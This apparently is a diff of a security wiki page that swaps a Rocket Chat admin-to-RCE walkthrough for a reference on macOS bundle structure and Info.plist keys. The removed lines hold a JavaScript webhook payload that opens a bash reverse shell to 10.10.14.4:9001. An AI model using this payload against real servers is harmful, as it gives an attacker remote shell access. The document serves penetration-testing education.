@@ -1,4 +1,4 @@
-# Rocket Chat
+# macOS Bundles
 
 <details>
 
@@ -12,37 +12,43 @@
 
 </details>
 
-## RCE
+## Basic Information
 
-If you are admin inside Rocket Chat you can get RCE.
+Basically, a bundle is a **directory structure** within the file system. Interestingly, by default this directory **looks like a single object in Finder**.&#x20;
 
-* Got to **`Integrations`** and select **`New Integration`** and choose any: **`Incoming WebHook`** or **`Outgoing WebHook`**.
-  * `/admin/integrations/incoming`
+The **common** frequent bundle we will encounter is the **`.app` bundle**, but many other executables are also packaged as bundles, such as **`.framework`** and **`.systemextension`**.
 
-<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
+The types of resources contained within a bundle may consist of applications, libraries, images, documentation, header files, etc. All these files are inside `<application>.app/Contents/`
 
-* According to the [docs](https://docs.rocket.chat/guides/administration/admin-panel/integrations), both use ES2015 / ECMAScript 6 ([basically JavaScript](https://codeburst.io/javascript-wtf-is-es6-es8-es-2017-ecmascript-dca859e4821c)) to process the data. So lets get a [rev shell for javascript](../../generic-methodologies-and-resources/shells/linux.md#nodejs) like:
-
-```javascript
-const require = console.log.constructor('return process.mainModule.require')();
-const { exec } = require('child_process');
-exec("bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'")
+```bash
+ls -lR /Applications/Safari.app/Contents
 ```
 
-* Configure the WebHook (the channel and post as username must exists):
+*   `Contents/_CodeSignature`
 
-<figure><img src="../../.gitbook/assets/image (1) (8).png" alt=""><figcaption></figcaption></figure>
+    Contains **code-signing information** about the application (i.e., hashes, etc.).
+*   `Contents/MacOS`
 
-* Configure WebHook script:
+    Contains the **application’s binary** (which is executed when the user double-clicks the application icon in the UI).
+*   `Contents/Resources`
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+    Contains **UI elements of the application**, such as images, documents, and nib/xib files (that describe various user interfaces).
+* `Contents/Info.plist`\
+  The application’s main “**configuration file.**” Apple notes that “the system relies on the presence of this file to identify relevant information about \[the] application and any related files”.
+  * **Plist** **files** contains configuration information. You can find find information about the meaning of they plist keys in [https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)
+  *   Pairs that may be of interest when analyzing an application include:\\
 
-* Save changes
-* Get the generated WebHook URL:
+      * **CFBundleExecutable**
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+      Contains the **name of the application’s binary** (found in Contents/MacOS).
 
-* Call it with curl and you shuold receive the rev shell
+      * **CFBundleIdentifier**
+
+      Contains the application’s bundle identifier (often used by the system to **globally** **identify** the application).
+
+      * **LSMinimumSystemVersion**
+
+      Contains the **oldest** **version** of **macOS** that the application is compatible with.
 
 <details>
 
